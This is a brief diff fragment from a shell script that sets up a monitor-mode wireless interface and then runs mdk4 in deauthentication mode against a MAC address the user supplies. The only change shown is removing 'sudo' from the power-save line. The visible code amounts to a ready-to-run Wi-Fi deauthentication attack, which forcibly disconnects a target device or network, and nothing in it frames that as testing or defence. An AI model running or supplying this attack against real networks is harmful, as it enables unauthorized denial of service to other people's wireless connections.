@@ -36,6 +36,6 @@ read MAC
 
 iw dev $IFACE interface add mon0 type monitor
 
-sudo iw dev $IFACE set power_save off
+iw dev $IFACE set power_save off
 
 echo -n $MAC >MAC && mdk4 mon0 d -b MAC
